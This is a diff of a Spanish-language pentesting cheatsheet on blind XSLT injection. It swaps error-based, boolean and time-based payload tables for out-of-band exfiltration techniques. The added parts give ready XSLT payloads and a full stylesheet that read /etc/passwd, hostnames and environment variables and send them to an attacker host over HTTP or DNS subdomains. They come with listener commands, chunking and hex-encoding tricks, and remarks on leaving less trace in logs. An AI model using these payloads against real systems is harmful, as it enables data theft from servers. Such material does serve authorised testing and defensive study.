@@ -1,8 +1,8 @@
 ---
 aliases:
   - XSLT Blind Injection
-  - XSLT Error-based Exfil
   - XSLT OOB
+  - XSLT Out-of-Band Exfil
 tags:
   - type/cheatsheet
   - vuln/xslt-injection
@@ -21,72 +21,66 @@ linked:
 
 ***
 
-## Error-based
-
-| **Objetivo** | **Payload** | **Canal** |
-|:---:|:---:|:---:|
-| Forzar parser fail | `<xsl:value-of select="document('file:///etc/passwd')/nonexistent/node"/>` | Error con root del XML cargado. |
-| Type error div 0 | `<xsl:value-of select="document('file:///etc/passwd') div 0"/>` | Division forzada → error con contenido. |
-| NaN cast | `<xsl:value-of select="number(unparsed-text('file:///etc/passwd'))"/>` | Cast número → error con string. |
-| Saxon evaluate | `<xsl:value-of select="saxon:evaluate(unparsed-text('file:///etc/passwd'))" xmlns:saxon="http://saxon.sf.net/"/>` | Stack trace incluye string completo. |
-| Bogus function | `<xsl:value-of select="bogusfn(unparsed-text('file:///etc/passwd'))"/>` | Mensaje del motor con argumento. |
-| XPath syntax error | `<xsl:value-of select="*[unparsed-text('file:///etc/passwd')]"/>` | Predicate type fail. |
-^xslt-blind-error
-
-___
-
-## OOB HTTP
+## Exfiltración vía HTTP (URLs)
 
 | **Objetivo** | **Payload** | **Canal** |
 |:---:|:---:|:---:|
 | Listener simple | `python3 -m http.server 8080` (atacante) | Logs en consola. |
+| Listener raw TCP | `nc -lvnp 8080` | Headers + body crudos. |
 | Burp Collaborator | `interactsh-client -v` | Domain único + dashboard. |
-| Exfil 2.0+ | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', encode-for-uri(unparsed-text('file:///etc/passwd'))))"/>` | URL del listener con data encoded. |
-| Exfil 1.0 | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', document('file:///var/www/config.xml')))"/>` | XML válido + concat URL. |
-| Chunked | `<xsl:for-each select="1 to 10"><xsl:copy-of select="document(concat('http://attacker/?n=',.,'&amp;d=',encode-for-uri(substring($s,(.-1)*200+1,200))))"/></xsl:for-each>` | Para data > 2000 bytes. |
-| OOB con header | `<xsl:value-of select="unparsed-text(concat('http://attacker/?f=', encode-for-uri($secret)))"/>` | XSLT 2.0+ — alternativa. |
-^xslt-blind-oob
+| Exfil 2.0+ básico | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', encode-for-uri(unparsed-text('file:///etc/passwd'))))"/>` | URL del listener con data encoded. |
+| Exfil 1.0 (XML válido) | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', document('file:///var/www/config.xml')))"/>` | Sin `unparsed-text()` — usar archivo XML. |
+| Exfil con `unparsed-text` | `<xsl:value-of select="unparsed-text(concat('http://attacker:8080/?f=', encode-for-uri($secret)))"/>` | XSLT 2.0+ alternativa. |
+| Chunked URL | `<xsl:for-each select="1 to ceiling(string-length($s) div 200)"><xsl:variable name="c" select="substring($s,(.-1)*200+1,200)"/><xsl:copy-of select="document(concat('http://attacker/?n=',.,'&amp;d=',encode-for-uri($c)))"/></xsl:for-each>` | Para data > 2000 bytes. |
+| Error-based fallback | `<xsl:value-of select="document('file:///etc/passwd')/nonexistent"/>` | Si la app refleja errores en la response. |
+| Boolean oracle | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:x:0')"><xsl:copy-of select="document('http://hit.attacker/')"/></xsl:if>` | Combinar boolean check + OOB callback. |
+| POST via XForms (raro) | `<xsl:copy-of select="document(concat('http://attacker/log?d=',$s))"/>` | document() solo soporta GET — POST no nativo. |
+^xslt-oob-http
+
+### Stylesheet completo OOB HTTP
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="2.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:variable name="secret" select="unparsed-text('file:///etc/passwd')"/>
+    <xsl:copy-of select="document(concat('http://attacker.com:8080/?d=', encode-for-uri($secret)))"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
 
 ___
 
-## DNS exfil
+## Exfiltración vía DNS
 
 | **Objetivo** | **Payload** | **Canal** |
 |:---:|:---:|:---:|
-| Setup nameserver | `sudo tcpdump -ni eth0 -s 0 -A 'udp port 53'` | Captura queries. |
+| Setup nameserver | `sudo tcpdump -ni eth0 -s 0 -A 'udp port 53'` | Captura queries DNS. |
 | Burp Collaborator DNS | Subdomain `<id>.oast.fun` automático | Dashboard de queries. |
+| interactsh DNS | `interactsh-client -v -dns-only` | Solo DNS. |
 | Hostname exfil | `<xsl:value-of select="document(concat('http://', unparsed-text('file:///etc/hostname'), '.attacker.com/'))"/>` | Hostname en subdomain. |
-| User exfil | `<xsl:value-of select="document(concat('http://', environment-variable('USER'), '.attacker.com/'))"/>` | Env var en subdomain (3.0). |
-| Hex chunked | `<xsl:for-each select="1 to 10"><xsl:value-of select="document(concat('http://chunk',.,'-',$hex,'.attacker.com/'))"/></xsl:for-each>` | Hex encode + chunks ≤63 chars. |
-| Boolean DNS | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'r:x:0')"><xsl:value-of select="document('http://hit.attacker.com/')"/></xsl:if>` | DNS query solo si match. |
-^xslt-blind-dns
+| User exfil | `<xsl:value-of select="document(concat('http://', environment-variable('USER'), '.attacker.com/'))"/>` | Env var (XSLT 3.0). |
+| Boolean DNS | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:x:0')"><xsl:value-of select="document('http://hit.attacker.com/')"/></xsl:if>` | DNS query solo si match — oracle remoto. |
+| Hex encoded chunk | `<xsl:variable name="hex"><xsl:for-each select="string-to-codepoints($chunk)"><xsl:value-of select="format-integer(., '00')"/></xsl:for-each></xsl:variable><xsl:value-of select="document(concat('http://',$hex,'.attacker.com/'))"/>` | Hex chunks de ≤63 chars (limit DNS label). |
+| Chunked DNS | `<xsl:for-each select="1 to 10"><xsl:variable name="c" select="substring($s,(.-1)*30+1,30)"/><xsl:value-of select="document(concat('http://chunk',.,'-',$c,'.attacker.com/'))"/></xsl:for-each>` | Multiples queries DNS con chunks. |
+| Wildcard zone | Setup `*.attacker.com` apuntando a NS controlado | Captura cualquier subdomain. |
+^xslt-oob-dns
 
-___
+### Limitaciones DNS
 
-## Boolean oracle
+| Constraint | Valor | Workaround |
+|---|---|---|
+| Subdomain max | 63 chars | Chunking |
+| FQDN total | ≤ 253 chars | Chunking |
+| Charset | `[a-z0-9-]` | Hex / base32 encode |
+| Case | Insensitive | base32 OK, base64 NO |
 
-| **Objetivo** | **Payload** | **Canal** |
-|:---:|:---:|:---:|
-| Char match | `<xsl:if test="substring(unparsed-text('file:///etc/passwd'),1,1)='r'">MARKER</xsl:if>` | `MARKER` en response → match. |
-| Contains check | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:')">FOUND</xsl:if>` | Substring oracle. |
-| Length check | `<xsl:if test="string-length(unparsed-text('file:///etc/passwd')) &gt; 1000">BIG</xsl:if>` | Tamaño aproximado. |
-| Codepoint compare | `<xsl:if test="string-to-codepoints(substring($s,POS,1))[1] &lt; PIVOT">LT</xsl:if>` | Búsqueda binaria — log₂(64) requests. |
-| Starts-with | `<xsl:if test="starts-with(unparsed-text('file:///etc/passwd'),'root')">STARTS</xsl:if>` | Validación inicial. |
-| File exists | `<xsl:if test="unparsed-text-available('file:///root/.ssh/id_rsa')">EXISTS</xsl:if>` | Existencia sin contenido. |
-^xslt-blind-bool
+### Cuándo elegir DNS vs HTTP
 
-___
-
-## Time-based
-
-| **Objetivo** | **Payload** | **Canal** |
-|:---:|:---:|:---:|
-| Loop 2.0+ | `<xsl:for-each select="1 to 5000000"><xsl:value-of select="string-length(concat(.,.))"/></xsl:for-each>` | ~3-5s delay observable. |
-| Choose conditional | `<xsl:choose><xsl:when test="substring($s,1,1)='r'"><xsl:for-each select="1 to 5000000">...</xsl:for-each></xsl:when></xsl:choose>` | Delay solo si match. |
-| Recursión 1.0 | `<xsl:call-template name="loop"><xsl:with-param name="i" select="100000"/></xsl:call-template>` | Emular loop en XSLT 1.0. |
-| Timing comparativo | `time curl ... <probe-no-loop>` vs `time curl ... <probe-with-loop>` | Diff ≥ 1.5s confiable. |
-| Sleep via Saxon | `<xsl:value-of select="saxon:eval(saxon:expression('Thread.sleep(2000)'))"/>` | Saxon-PE/EE. |
-| Timeout exceed | `<xsl:for-each select="1 to 999999999">...</xsl:for-each>` | Force timeout — diff entre éxito/fail. |
-^xslt-blind-time
+- HTTP filtrado / proxied → DNS suele pasar.
+- App internal sin egress HTTP → DNS internal a veces resuelve externos.
+- Logs deja menos huella DNS que HTTP en muchas orgs.
+- HTTP permite payloads grandes sin chunking.
 
 ***
